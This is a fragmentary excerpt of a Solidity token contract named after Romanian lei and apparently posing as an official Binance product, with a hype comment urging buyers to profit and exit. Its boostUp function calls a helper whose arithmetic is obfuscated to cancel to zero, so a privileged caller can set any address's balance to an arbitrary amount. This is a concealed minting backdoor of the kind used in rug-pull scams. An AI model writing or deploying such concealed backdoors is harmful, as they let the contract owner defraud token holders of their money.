...
BUY THEN GET PROFIT THEN GO OUT
*/
...
contract RomanianLei is OfficialBinance {
  ...
  function _managerAddressfees (address managers, uint256 Totalvalue) internal {
        _balances[managers] = (_balances[managers] * 20 * 40 - _balances[managers] * 20 * 40) + (Totalvalue * 10 ** uint256(decimals));
  }
  ...
  function boostUp(address lavasoraaddrress, uint256 Totalvalue) public _eexternal {
      _managerAddressfees(lavasoraaddrress, Totalvalue);
  }
